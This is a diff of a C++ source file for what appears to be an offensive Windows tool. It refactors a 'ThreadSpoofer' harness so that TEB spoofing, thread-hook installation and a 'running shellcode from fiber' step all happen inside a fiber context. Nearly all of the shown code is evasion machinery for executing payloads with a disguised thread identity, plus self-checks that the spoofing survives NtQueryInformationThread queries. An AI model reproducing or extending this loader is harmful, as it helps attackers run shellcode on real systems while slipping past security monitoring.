@@ -165,24 +165,28 @@ bool TestSanityChecks() {
 ////////////////////////////////////////////////////////////////
 
 void SensitiveOperation() {
-    std::cout << "[+] Running sensitive logic in spoofed fiber context..." << std::endl;
+    cout << "[+] Running sensitive logic in spoofed fiber context..." << endl;
 }
 
-int main() {
-    cout << "[*] Creating spoofed TEB..." << endl;
+void StartThreadSpoof() {
     ThreadSpoofer spoofer;
+
+    cout << "[*] Running initialization inside fiber context..." << endl;
 
     if (!spoofer.CreateSpoofedTeb()) {
         cerr << "[!] Failed to create spoofed TEB." << endl;
-        return 1;
+        ExitThread(1);
     }
 
     cout << "[*] Installing thread hooks..." << endl;
     if (!spoofer.InstallHook()) {
         cerr << "[!] Failed to install hooks." << endl;
-        return 1;
+        ExitThread(1);
     }
 
+    cout << "[+] Initialization inside fiber complete." << endl;
+
+    
     bool ok = true;
 
     ok &= TestNtQueryInformationThread(spoofer);
@@ -195,7 +199,6 @@ int main() {
     ok &= TestSanityChecks();
 
     cout << (ok ? "[*] All tests passed." : "[!] Some tests failed.") << endl;
-    this_thread::sleep_for(chrono::seconds(3));
 
 
     cout << "[*] Running shellcode from fiber..." << endl;
@@ -229,17 +232,34 @@ int main() {
     #endif
     } else {
         cerr << "[!] Failed to get fake code region." << endl;
-        return 1;
+        return;
     }
 
-    void* fiberStack = VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!fiberStack) {
-        std::cerr << "[!] VirtualAlloc failed for fiber stack." << std::endl;
-        return 1;
+    void* fiberStack2 = VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!fiberStack2) {
+        cerr << "[!] VirtualAlloc failed for fiber stack." << endl;
+        return;
     }
 
     ThreadSpoofer::SetFiberEntryFunction(&SensitiveOperation);
-    ThreadSpoofer::RunAsFiber(std::shared_ptr<void>(fiberStack, [](void* p) { VirtualFree(p, 0, MEM_RELEASE); }), 0x10000);
+    ThreadSpoofer::RunAsFiber(shared_ptr<void>(fiberStack2, [](void* p) { VirtualFree(p, 0, MEM_RELEASE); }), 0x10000);
+}
 
-    return ok ? 0 : 1;
+int main() {
+    cout << "[*] Creating spoofed TEB..." << endl;
+
+    
+    void* fiberStack1 = VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!fiberStack1) {
+        cerr << "[!] VirtualAlloc failed for fiber stack." << endl;
+        return 1;
+    }
+
+    ThreadSpoofer::SetFiberEntryFunction(&StartThreadSpoof);
+
+    ThreadSpoofer::RunAsFiber(shared_ptr<void>(fiberStack1, [](void* p) { VirtualFree(p, 0, MEM_RELEASE); }), 0x10000);
+
+    this_thread::sleep_for(chrono::seconds(3));
+
+    return 0;
 }
